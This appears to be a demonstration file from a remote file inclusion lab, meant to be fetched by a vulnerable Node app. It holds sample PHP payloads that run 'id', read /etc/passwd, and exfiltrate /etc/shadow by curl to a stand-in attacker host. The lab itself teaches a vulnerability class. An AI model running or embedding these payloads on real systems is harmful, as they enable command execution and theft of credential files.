ATTACKER-CONTROLLED CONTENT — RFI Demo
========================================
This file was fetched from the attacker's server and included in the target page.

In a real PHP app (allow_url_include=On), this file would contain executable code:

<?php system('id'); ?>
<?php readfile('/etc/passwd'); ?>
<?php exec('curl http://attacker:8000/exfil?d=' . base64_encode(file_get_contents('/etc/shadow'))); ?>

Here the Node app just fetches and displays the content (no execution),
but the mechanism is the same — the server made an outbound request to
an attacker-controlled host and rendered whatever it got back.
